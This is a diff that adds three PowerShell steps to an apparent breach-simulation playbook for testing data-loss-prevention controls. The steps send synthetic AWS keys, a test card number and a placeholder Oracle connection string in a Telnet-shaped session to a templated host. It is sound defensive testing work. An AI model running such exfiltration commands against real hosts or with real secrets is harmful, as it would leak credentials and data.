@@ -92,3 +92,147 @@ steps:
       # internal/telnetsink + internal/verifysync + internal/reporting's
       # sink-primary dlpVerifier, never from this script's own success/failure.
     cleanup: ""
+
+  - name: "DLP Validation — Telnet Exfiltration of AWS Cloud Credentials (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic AWS-credential-shaped record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, traffic-shape simulation only, not an actual Telnet connection."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+      $token = "{{SINK_TOKEN}}"
+      $session = @(
+        @{ type = "connect" }
+        @{ type = "prompt"; data = "login: " }
+        @{ type = "command"; data = "$token`n$payload" }
+        @{ type = "response"; data = "Login successful`n$ " }
+        @{ type = "close" }
+      )
+      $body = @{
+        token = $token
+        session = $session
+      } | ConvertTo-Json -Depth 5 -Compress
+      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
+        Write-Output "EXEC T1048.003: AWS-credential-shaped Telnet session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
+      }
+      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
+      # graded verdict comes entirely from whether the Telnet sink actually
+      # received a request with a matching token, resolved server-side by
+      # internal/telnetsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own success/failure.
+    cleanup: ""
+
+  - name: "DLP Validation — Telnet Exfiltration of Discover Card Record (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic Discover-card-shaped record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, traffic-shape simulation only, not an actual Telnet connection."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nDiscover,6011111111111117"
+      $token = "{{SINK_TOKEN}}"
+      $session = @(
+        @{ type = "connect" }
+        @{ type = "prompt"; data = "login: " }
+        @{ type = "command"; data = "$token`n$payload" }
+        @{ type = "response"; data = "Login successful`n$ " }
+        @{ type = "close" }
+      )
+      $body = @{
+        token = $token
+        session = $session
+      } | ConvertTo-Json -Depth 5 -Compress
+      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
+        Write-Output "EXEC T1048.003: Discover-card-shaped Telnet session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
+      }
+      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
+      # graded verdict comes entirely from whether the Telnet sink actually
+      # received a request with a matching token, resolved server-side by
+      # internal/telnetsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own success/failure.
+    cleanup: ""
+
+  - name: "DLP Validation — Telnet Exfiltration of Oracle DB Connection String (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic Oracle-DB-connection-string-shaped record to the platform's own Telnet-session-shaped endpoint (this same on-prem orchestrator). No real Telnet server, traffic-shape simulation only, not an actual Telnet connection."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/network controls: Telnet-shaped HTTPS POST (conversation states) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "Data Source=BAS-SIM-ORACLE;User Id=bas_sim_user;Password=BAS-SIM-DLP-Placeholder1;"
+      $token = "{{SINK_TOKEN}}"
+      $session = @(
+        @{ type = "connect" }
+        @{ type = "prompt"; data = "login: " }
+        @{ type = "command"; data = "$token`n$payload" }
+        @{ type = "response"; data = "Login successful`n$ " }
+        @{ type = "close" }
+      )
+      $body = @{
+        token = $token
+        session = $session
+      } | ConvertTo-Json -Depth 5 -Compress
+      $uri = "https://{{SINK_TELNET_HOST}}:{{SINK_TELNET_PORT}}/telnet/session"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: telnet_session_result=success"
+        Write-Output "EXEC T1048.003: Oracle-connection-string-shaped Telnet session simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: telnet_session_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: Telnet-compatible login session simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-TELNET]"
+      }
+      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
+      # graded verdict comes entirely from whether the Telnet sink actually
+      # received a request with a matching token, resolved server-side by
+      # internal/telnetsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own success/failure.
+    cleanup: ""
